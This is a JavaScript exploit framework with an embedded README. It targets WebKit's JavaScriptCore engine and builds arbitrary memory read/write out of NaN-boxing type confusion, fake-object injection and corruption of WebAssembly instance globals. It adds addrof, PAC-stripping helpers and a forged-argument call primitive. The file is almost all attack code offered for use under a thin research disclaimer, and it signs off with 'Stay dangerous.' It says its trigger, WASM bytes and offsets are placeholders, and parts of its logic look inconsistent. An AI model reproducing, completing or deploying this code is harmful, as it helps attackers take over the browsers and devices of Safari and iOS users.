/**
 * @file wasm-navigator.js
 * @description JavaScriptCore arbitrary read/write primitive using NaN-boxing type confusion + dual WebAssembly instance global corruption
 * 
 * Consolidated, self-contained implementation of a JSC memory access primitive
 * inspired by various WebKit exploit techniques (circa 2023–2025 era).
 * 
 * Combines:
 * - NaN-boxing / structure ID confusion to leak structure IDs and compute NaN offset correction
 * - Fake object injection via butterfly transplantation
 * - Dual WebAssembly instance trick to corrupt global storage pointers for arb r/w without array bounds
 * - Comprehensive memory API (32/64-bit r/w, addrof, backing store leak, string readers, bulk copy, forged call primitive, etc.)
 * - PAC-aware pointer handling for arm64e platforms (iOS/macOS)
 * 
 * ⚠️ FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY.
 * Do NOT run against production browsers or systems without explicit authorization.
 * 
 * @see README section below for full usage, notes, legal warning, credits
 * 
 * @author SleepTheGod (@portknock)
 * @version 2026-03-05
 */

/*
================================================================================
                           FULL README (embedded)
================================================================================

wasm-navigator
JavaScriptCore arbitrary read/write primitive using NaN-boxing type confusion + dual WebAssembly instance global corruption

This is a consolidated, self-contained implementation of a JSC memory access primitive 
originally inspired by various WebKit exploit techniques (circa 2023–2025 era). It combines:

• NaN-boxing / structure ID confusion to leak structure IDs and compute NaN offset correction
• Fake object injection via butterfly transplantation
• Dual WebAssembly instance trick to corrupt global storage pointers for arb r/w without array bounds
• Comprehensive memory API (32/64-bit r/w, addrof, backing store leak, string readers, bulk copy, forged call primitive, etc.)
• PAC-aware pointer handling for arm64e platforms (iOS/macOS)

⚠️ For educational and security research purposes only. Do not run against production browsers or systems without explicit authorization.

Features
• 32-bit & 64-bit arbitrary read/write
• addrof() via reference cell
• TypedArray backing store pointer leak
• Null-terminated & wide-char string reading
• Memory fill/copy/hexdump helpers
• Temporary forged-argument function calling (Pr())
• Persistent read/write channel via fakeobj + WASM globals

Usage
// 1. You still need a working NaN-boxing trigger + structureID leak
//    (not included here — plug your own confusion primitive)

// 2. Instantiate
const p = new P();

// 3. Perform cross-instance corruption (redirects navigator globals → executor)
p.corruptCrossInstance();

// 4. Use the API
console.log("Reading 32-bit at 0x10000000:", p.rr(0x10000000));
p.sr(0x10000000, 0x41414141);

const objAddr = p.ne({a:1, b:2});
console.log("Object address:", objAddr.toString(16));

const str = p.lr({toString: () => "hello from memory"}, 100);
console.log("Leaked string:", str);

Important Notes
• The WASM binary bytes are placeholder — you must replace wasmBytes with a real module 
  that exports a,b,c,d with the exact behavior described (globals manipulation).
• Offsets (FSCw9f, VMMcyp, backing store offset 0x20, etc.) are symbolic/example values. 
  They change per WebKit build. You need runtime offset discovery or per-version hardcoding.
• this.ne() (addrof) is fake — it assumes a reference cell at this.Ur. 
  Replace with your real addrof primitive.
• NaN offset correction (T.Dn.Mn) is set via parseConfusion() — call it after your confusion trigger.
• This exact WASM global corruption technique was nerfed/hardened in late 2025 WebKit builds. 
  For latest Safari/iOS you may need to pivot to TypedArray backing store confusion or WASM linear memory corruption.

Legal / Ethical Warning
This code demonstrates techniques that can be used to achieve memory read/write in WebKit browsers.
Use only in controlled research environments, CTF challenges, or when you have explicit permission to test target systems.
Misuse may violate laws (CFAA, DMCA, local computer fraud/abuse statutes, etc.).

Credits / Inspiration
• Updated Logic From https://github.com/rationalpsyche/Talks/
• Various public WebKit exploit write-ups (2022–2025)
• Techniques seen in Pwn2Own / real-world WebKit chains
• The legendary "navigator + executor" dual-instance pattern

Stay dangerous.
— SleepTheGod & friends
================================================================================
*/

class P {
    constructor() {
        // Mode & offsets
        this.nr = false;                    // false = normal (validated), true = direct
        this.Ir = -8;                       // global redirect alignment (common value)
        this.Jr = 32;                       // example offset between globals — tune per build
        this.Cr = 0n;                       // saved navigator global storage ptr
        this.Kr = 0;                        // value read via redirected call
        this.Vr = 0x1337;                   // example value for confusion write

        // PAC mask (common arm64e userland value — real one leaked in production)
        this.o = 0x00000FFFFFFFFFFFn;
        this.iiExAt = true;                 // force PAC stripping by default

        // Fake config — in real exploit these are runtime-leaked or hardcoded per build
        this.T = {
            Dn: {
                Mn: 0,                      // NaN-boxing correction — set later
                Hn: {
                    FSCw9f: 0x50,           // WasmInstance -> global storage offset example
                    VMMcyp: 0x18            // additional offset to actual globals array
                }
            }
        };

        // K.* helpers (obfuscated pointer/double conversions)
        this.K = {
            J:   (v) => Number(v),
            q:   (a, o) => Number(BigInt(a) + BigInt(o)),
            Y:   (b, o) => Number(BigInt(b) + BigInt(o)),
            _:   (v) => BigInt(v),
            F:   (v) => Number(v & 0xFFFFFFFFn),
            C:   (v) => 0xdead0000,         // placeholder addr const
            T:   (vt) => (BigInt(vt.et) << 32n) | BigInt(vt.it)
        };

        // Reference cell for addrof (placeholder — replace with real leak primitive)
        this.yr = { a: null };
        this.Ur = 0x1000;                   // fake — real offset to reference cell

        // WASM binary (symbolic — REPLACE WITH REAL XOR-DECODED BYTES)
        const wasmBytes = new Uint8Array([
            0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
            // ... paste your actual minimal WASM module here ...
            // Must export "a","b","c","d" manipulating 3 mutable globals as described
        ]);
        const mod = new WebAssembly.Module(wasmBytes.buffer);
        this.Er = new WebAssembly.Instance(mod, {});  // executor
        this.Nr = new WebAssembly.Instance(mod, {});  // navigator

        // JIT warm-up loop (helps force compilation of WASM functions)
        for (let i = 0; i < 22; i++) {
            this.Er.exports.c?.() ?? 0;
            this.Er.exports.d?.(0);
            this.Er.exports.a?.();
            this.Er.exports.b?.(0n);
        }

        // Run fakeobj setup + persistent channel
        this.Xr();
    }

    // ─── Confusion result parser ────────────────────────────────────────
    parseConfusion(i, expectedStructure, expectedButterfly) {
        const S = {
            Qr: (i[1] >> 20) & 0xFFF,
            zr: (i[1] >> 16) & 0xF,
            Fr: i[1] & 0xFFFF,
            Lr: (i[0] >> 24) & 0xFF,
            Rr: i[0] & 0x1FFFFF
        };
        if (S.Qr !== expectedStructure) throw new Error(`structureID mismatch: got ${S.Qr}, expected ${expectedStructure}`);
        if (S.Rr !== expectedButterfly) throw new Error(`butterfly mismatch: got ${S.Rr}, expected ${expectedButterfly}`);
        const offsetCorrection = 65536 * (S.zr - 4);
        this.T.Dn.Mn = offsetCorrection;
    }

    // ─── WASM global storage locator ────────────────────────────────────
    getGlobalStorage(instanceObj) {
        instanceObj[0] = 1;
        const addr = this.ne(instanceObj);
        return this.rr(Number(addr) + this.T.Dn.Hn.FSCw9f) + this.T.Dn.Hn.VMMcyp;
    }

    // ─── Cross-instance corruption ──────────────────────────────────────
    corruptCrossInstance() {
        const navGlobals = this.getGlobalStorage(this.Nr);
        const exeGlobals = this.getGlobalStorage(this.Er);
        this.Cr = BigInt(navGlobals);
        this.sr(navGlobals, Number(exeGlobals + this.Jr));
        this.Kr = this.Nr.exports.a?.() ?? 0;
    }

    // ─── Address targeting ──────────────────────────────────────────────
    Zr(addr) {
        const addrNum = Number(BigInt(addr)); // safer BigInt → Number conversion
        if (this.nr === false) {
            if (addrNum < 65536 || isNaN(addrNum)) throw new Error(`invalid address: ${addrNum}`);
            this.Nr.exports.b?.(this.K.J(addrNum + this.Ir));
        } else {
            this.Nr.exports.b?.(this.K.q(addrNum, this.Ir));
        }
    }

    // ─── Core read/write ────────────────────────────────────────────────
    rr(addr) {
        this.Zr(addr);
        return this.Er.exports.c?.() >>> 0;
    }

    sr(addr, val) {
        this.Zr(addr);
        this.Er.exports.d?.(val | 0);
    }

    Yr(addr, val) {
        this.sr(addr, val >>> 0);
        this.sr(addr + 4, Number(BigInt(val) / 4294967296n >>> 0n));
    }

    Dr(addr, vt) {
        this.sr(addr, vt.it);
        this.sr(addr + 4, vt.et);
    }

    jr(addr, lo, hi) {
        this.sr(addr, lo);
        this.sr(addr + 4, hi);
    }

    ee(addr) {
        const lo = this.rr(addr);
        const hi = this.rr(addr + 4);
        if (hi > Number(this.o & 0xFFFFFFFFn)) throw new Error("high word PAC violation");
        return (BigInt(hi) << 32n) | BigInt(lo);
    }

    // ─── Object introspection ───────────────────────────────────────────
    ne(obj) {
        this.yr.a = obj;
        return Number(this.ee(this.Ur));
    }

    Ar(ta, strip = true) {
        const objAddr = BigInt(this.ne(ta));
        const bsAddr = this.ee(Number(objAddr + 0x20n)); // symbolic offset — tune!
        return strip ? this.br(bsAddr) : bsAddr;
    }

    // ─── PAC-aware pointer read ─────────────────────────────────────────
    br(addr, force = false) {
        const val = this.ee(Number(addr));
        if (force || this.iiExAt) return val & this.o;
        return val;
    }

    re(addr) {
        return {
            it: this.rr(Number(addr)),
            et: this.rr(Number(addr) + 4)
        };
    }

    hr(vtAddr) {
        return this.re(Number(this.K.T(vtAddr)));
    }

    ar(vtAddr) {
        return this.K.T(vtAddr);
    }

    // ─── String & memory readers ────────────────────────────────────────
    lr(obj, max = 256) {
        const addr = BigInt(this.ne(obj));
        let str = "";
        for (let i = 0; i < max; i++) {
            const c = this.cr(addr + BigInt(i));
            if (c === 0) break;
            str += String.fromCharCode(c);
        }
        return str;
    }

    dr(addr, max = 256) {
        let str = "";
        for (let i = 0; i < max * 2; i += 2) {
            const c = this.rr(Number(BigInt(addr) + BigInt(i))) & 0xFFFF;
            if (c === 0) break;
            str += String.fromCharCode(c);
        }
        return str;
    }

    ur(addr, len) {
        let str = "";
        for (let i = 0; i < len; i++) {
            str += String.fromCharCode(this.cr(BigInt(addr) + BigInt(i)));
        }
        return str;
    }

    gr(addr, len) {
        let str = "";
        for (let i = 0; i < len * 2; i += 2) {
            str += String.fromCharCode(this.rr(Number(BigInt(addr) + BigInt(i))) & 0xFFFF);
        }
        return str;
    }

    cr(addr) {
        const aligned = Number(addr - (addr % 4n));
        const shift = Number((addr % 4n) * 8n);
        return (this.rr(aligned) >> shift) & 0xFF;
    }

    wr(addr) {
        const aligned = Number(addr - (addr % 2n));
        const shift = Number((addr % 2n) * 8n);
        return (this.rr(aligned) >> shift) & 0xFFFF;
    }

    // ─── Bulk operations ────────────────────────────────────────────────
    ir(addr, val, len) {
        for (let i = 0; i < len; i += 4) {
            this.sr(Number(BigInt(addr) + BigInt(i)), val);
        }
    }

    er(dst, src, len) {
        this.nr = true;
        try {
            for (let i = 0; i < len; i += 4) {
                const v = this.rr(Number(BigInt(src) + BigInt(i)));
                this.sr(Number(BigInt(dst) + BigInt(i)), v);
            }
        } finally {
            this.nr = false;
        }
    }

    le(vtAddr) {
        this.nr = true;
        const v = this.rr(Number(this.K.T(vtAddr)));
        this.nr = false;
        return v;
    }

    tr(addr, len = 64, off = 0) {
        let out = "";
        for (let i = 0; i < len; i += 8) {
            const a = Number(BigInt(addr) + BigInt(i + off));
            const lo = this.rr(a);
            const hi = this.rr(a + 4);
            out += `${a.toString(16).padStart(16,'0')} (${off+i}): ${hi.toString(16).padStart(8,'0')}${lo.toString(16).padStart(8,'0')}\n`;
        }
        return out;
    }

    // ─── Buffer allocation ──────────────────────────────────────────────
    Tr(size, expand = false) {
        const buf = new ArrayBuffer(size);
        const addr = this.Ar(buf, false);
        if (expand) {
            // fake expand capacity field (example offset)
            const capOffset = 0x10; // symbolic — tune per build
            this.Yr(Number(addr + BigInt(capOffset)), size + 32);
        }
        return addr;
    }

    mr(str) {
        const buf = new ArrayBuffer(str.length * 2);
        const dv = new DataView(buf);
        for (let i = 0; i < str.length; i++) {
            dv.setUint16(i * 2, str.charCodeAt(i), true);
        }
        return this.Ar(buf, true);
    }

    // ─── Call with forged args ──────────────────────────────────────────
    Pr(func, ...args) {
        const saved = new Array(args.length);
        for (let i = 0; i < args.length; i++) {
            saved[i] = this.re(Number(args[i].Sr));
        }
        try {
            for (let i = 0; i < args.length; i++) {
                this.Dr(Number(args[i].Sr), args[i].Zt);
            }
            func();
        } finally {
            for (let i = 0; i < args.length; i++) {
                this.Dr(Number(args[i].Sr), saved[i]);
            }
        }
    }

    // ─── Fake object injection & persistent channel ─────────────────────
    Xr() {
        const single = JSON.parse("[0]");
        const many   = JSON.parse("[1,1,1,1,1,1,1,1,1,1,1,1,1]");
        single[0] = false;
        many[0]   = 1.2;

        const fake = { vr: 0.1, Hr: 0.2, $r: 0.3, Gr: 0.4 };

        const fakeAddr       = BigInt(this.ne(fake));
        const manyAddr       = BigInt(this.ne(many));
        const singleAddr     = BigInt(this.ne(single));

        const manyButterfly  = this.ee(Number(manyAddr + 8n));
        const singleButterfly = this.ee(Number(singleAddr + 8n));

        // Transplant structure header (16 bytes)
        for (let i = 0; i < 16; i += 4) {
            this.sr(Number(fakeAddr + 20n + BigInt(i)), this.rr(Number(manyAddr + BigInt(i))));
        }

        const hrConst = this.K.C(fake.Hr);

        // Redirect single array butterfly → fake inline storage
        this.Yr(Number(singleButterfly), Number(fakeAddr + 20n));

        let channel = single[0];
        single[0] = void 0;

        // Setup navigator read target
        fake.Hr = this.K.Y(hrConst, this.K._(this.Cr) - BigInt(this.T.Dn.Mn));
        fake.$r = this.K.Y(this.K.F(this.Cr), 703710);

        this.Nr.exports.b?.(this.Kr);

        channel[0] = this.K.J(this.Vr);

        // Retarget for many array butterfly
        fake.Hr = this.K.Y(hrConst, this.K._(manyButterfly) - BigInt(this.T.Dn.Mn));
        fake.$r = this.K.Y(this.K.F(manyButterfly), 703710);
    }
}

// Example usage (commented — do NOT run without real addrof + confusion trigger):
/*
const p = new P();
p.parseConfusion(/* your confused double array here * /, expectedStruct, expectedBf);
p.corruptCrossInstance();
console.log(p.rr(0x10000000));
*/
